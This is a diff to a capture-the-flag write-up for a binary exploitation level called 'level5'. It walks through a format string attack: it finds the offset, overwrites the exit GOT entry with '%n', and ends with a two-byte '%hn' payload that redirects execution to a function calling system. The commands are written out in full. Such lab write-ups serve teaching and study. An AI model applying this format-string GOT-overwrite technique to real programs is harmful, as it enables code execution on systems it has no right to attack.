@@ -24,7 +24,7 @@ find the offset
 
 python -c 'print "AAAA" + "%x " * 10' | ./level5
 
-we can find the offset, 4
+Offset is 4
 
 lets try to overwrite the exit entrypoint
 
@@ -36,22 +36,15 @@ run < <(python -c 'print "\x38\x98\x04\x08" + "%4$n"')
 x 0x8049828
 0x8049828 <exit@got.plt>:	0x00000004
 
-it work
+It work, we can now redirect to the o function 0x080484a4  
 
-we can now redirect to the function o which call system with the same technique as previous level
-gdb info functions
-0x080484a4  o
+lets do it with 2 bytes write 
 
-lets do it with 2 bytes write
+Lower addr => 0x84a4 - 0x8 = 33948
+High addr => 0x0804 - 0x84a4 = -31904 ?!
 
-0x0804 - 84a4
-find padding
-0x84a4 - 0x8
-0x0804 - 0x84a4
-we can use this little trick to overflow it
-0x10804 - 0x84a4
-
-add padding and win
+We can add this to overflow the sign operator
+High addr => 0x10804 - 0x84a4 = 33632
 
 cat <(python -c 'print "\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948x" + "%4$hn" + "%33632x"+  "%5$hn"') - | ./level5
 
